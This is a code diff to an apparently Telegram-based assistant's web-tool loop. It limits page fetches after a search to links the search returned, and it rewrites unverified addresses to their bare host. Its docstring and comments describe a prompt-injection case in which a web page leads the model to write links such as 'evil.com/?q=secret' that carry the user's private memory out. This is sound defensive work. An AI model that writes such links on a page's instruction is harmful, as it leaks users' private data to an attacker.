@@ -39,6 +39,8 @@ PERSONAL_TOOL_NAMES: frozenset[str] = frozenset({*WEB_TOOLS, *ARTIFACT_TOOLS, SK
 READ_SKILL_LIMIT = 2
 MAX_CALLS_PER_ROUND = 4
 POST_WEB_CREATE_ATTEMPTS = 2
+# After a search the model may open ONE page, and only a link the search returned.
+POST_WEB_FETCHES = 1
 # Plain answers and tool-call rounds share one ceiling (a round cannot know it is the last text one); only the
 # rounds where the model writes artifact HTML get more room.
 ANSWER_MAX_TOKENS = 1500
@@ -75,6 +77,7 @@ class PersonalToolRun:
     seen_urls: set[str] = field(default_factory=set)
     source_domains: list[str] = field(default_factory=list)
     post_web_create_attempts: int = 0
+    post_web_fetches: int = 0
 
     def __post_init__(self) -> None:
         if not self.web_enabled:
@@ -109,7 +112,10 @@ class PersonalToolRun:
         artifacts_ok = self.artifacts_enabled and self.artifact_context is not None
         names: set[str] = set()
         if self.web_used:
-            # Hard boundary after web content: no more web, nothing else; only the artifact trio when artifacts are on.
+            # Hard boundary after web content: no more searches and nothing else, except opening one page the search
+            # returned and, when artifacts are on, the artifact trio.
+            if web_ok and not self.web_context.exhausted and self.seen_urls and self.post_web_fetches < POST_WEB_FETCHES:
+                names.add("fetch_page")
             if artifacts_ok:
                 names |= {SKILL_TOOL, *ARTIFACT_TOOLS}
         else:
@@ -174,6 +180,10 @@ class PersonalToolRun:
             return self._read_skill(call)
         if call.name == "send_artifact":
             return await self._send_artifact(call)
+        if call.name == "fetch_page" and self.web_used:
+            if _normalize_url(str(call.arguments.get("url", ""))) not in self.seen_urls:
+                return _err(call.call_id, call.name, "Открывать можно только ссылки из результатов поиска.")
+            self.post_web_fetches += 1
         if call.name == "create_artifact":
             if self.web_used:
                 if self.post_web_create_attempts >= POST_WEB_CREATE_ATTEMPTS:
@@ -261,7 +271,11 @@ class PersonalToolRun:
 # --- link handling ---------------------------------------------------------------------------------
 
 _MD_LINK = re.compile(r"\[([^\]\n]{1,300})\]\((\s*<?)([^)\s>]+)>?[^)]*\)")
-_BARE_URL = re.compile(r"https?://[^\s<>\"')\]]+", re.IGNORECASE)
+# An address with or without a scheme: «evil.com/?q=secret» and «www.evil.com» are links in Telegram too.
+_ADDRESS = re.compile(
+    r"(?<![\w@.-])(?:https?://)?(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,24}(?::\d{1,5})?(?:[/?#][^\s<>\"')\]]*)?",
+    re.IGNORECASE,
+)
 
 
 def _normalize_url(url: str) -> str:
@@ -269,41 +283,65 @@ def _normalize_url(url: str) -> str:
 
 
 def _host(url: str) -> str:
+    candidate = url.strip()
+    if "://" not in candidate:
+        candidate = f"https://{candidate}"
     try:
-        host = urlsplit(url.strip()).hostname or ""
+        host = urlsplit(candidate).hostname or ""
     except ValueError:
         return ""
     return host.lower().removeprefix("www.")
 
 
-def strip_unverified_links(text: str, seen_urls: set[str] | frozenset[str]) -> str:
-    """Keep only links that a web tool returned in this request; any other URL becomes its bare host.
+def _is_verified(url: str, seen_urls: set[str] | frozenset[str]) -> bool:
+    normalized = _normalize_url(url)
+    if normalized in seen_urls:
+        return True
+    if "://" not in normalized:
+        return f"https://{normalized}" in seen_urls or f"http://{normalized}" in seen_urls
+    return False
 
-    A page can talk the model into writing ``[x](https://evil/?q=<private memory>)``; the person would then click a
-    link that carries their own data out. Showing the host only removes both the link and the payload.
+
+def _scrub_addresses(text: str, seen_urls: set[str] | frozenset[str]) -> str:
+    """Replace every address the web did not return by its host; a bare «host.tld» stays as it is."""
+
+    def replace(match: re.Match) -> str:
+        url = match.group(0)
+        if _is_verified(url, seen_urls):
+            return url
+        has_scheme = "://" in url
+        tail = url.split("://", 1)[-1]
+        has_payload = tail.rstrip("/") != re.split(r"[/?#]", tail, maxsplit=1)[0]
+        if not has_scheme and not has_payload and not tail.lower().startswith("www."):
+            return url  # «example.com» alone carries nothing out and is not worth rewriting
+        return _host(url) or "ссылка"
+
+    return _ADDRESS.sub(replace, text)
+
+
+def strip_unverified_links(text: str, seen_urls: set[str] | frozenset[str]) -> str:
+    """Keep only links that a web tool returned in this request; any other address becomes its bare host.
+
+    A page can talk the model into writing ``[x](https://evil/?q=<private memory>)`` or plain ``evil.com/?q=...``;
+    the person would then click a link that carries their own data out. Showing the host only removes both the link
+    and the payload.
     """
 
     def markdown(match: re.Match) -> str:
-        label, url = match.group(1), match.group(3)
-        if _normalize_url(url) in seen_urls:
-            return match.group(0)
+        label, url = _scrub_addresses(match.group(1), seen_urls), match.group(3)
+        if _is_verified(url, seen_urls):
+            return f"[{label}]({url})"
         host = _host(url)
         return f"{label} ({host})" if host else label
 
-    def bare(match: re.Match) -> str:
-        url = match.group(0)
-        if _normalize_url(url) in seen_urls:
-            return url
-        return _host(url) or "ссылка"
-
-    # Protect verified markdown links from the bare-URL pass by splitting around them.
+    # Protect verified markdown links from the address pass by splitting around them.
     parts: list[str] = []
     cursor = 0
     for link in _MD_LINK.finditer(text):
-        parts.append(_BARE_URL.sub(bare, text[cursor : link.start()]))
+        parts.append(_scrub_addresses(text[cursor : link.start()], seen_urls))
         parts.append(markdown(link))
         cursor = link.end()
-    parts.append(_BARE_URL.sub(bare, text[cursor:]))
+    parts.append(_scrub_addresses(text[cursor:], seen_urls))
     return "".join(parts)
 
 
@@ -374,6 +412,8 @@ async def run_tool_dialogue(
             text = (message.content or "").strip()
             if text and getattr(choice, "finish_reason", None) == "length":
                 text += "…"
+            if is_last and not text:
+                text = _FALLBACK_NOTICE
             if run.web_used:
                 text = run.tainted_text(text) if text else text
             return ToolTurnResult(text, run.web_used, False, round_index + 1)
@@ -409,6 +449,8 @@ async def run_tool_dialogue(
             except Exception:
                 log.warning("personal tools: commit between rounds failed", exc_info=True)
         spent = _spent_usd(sink)
+        if spent is None and run.cost_budget_usd is not None:
+            log.warning("personal tools: spent cost unknown, only the round limit applies")
         if run.cost_budget_usd is not None and spent is not None and spent >= run.cost_budget_usd * COST_CAP_SHARE:
             wind_down = True
     return ToolTurnResult("", run.web_used, False, run.total_rounds)
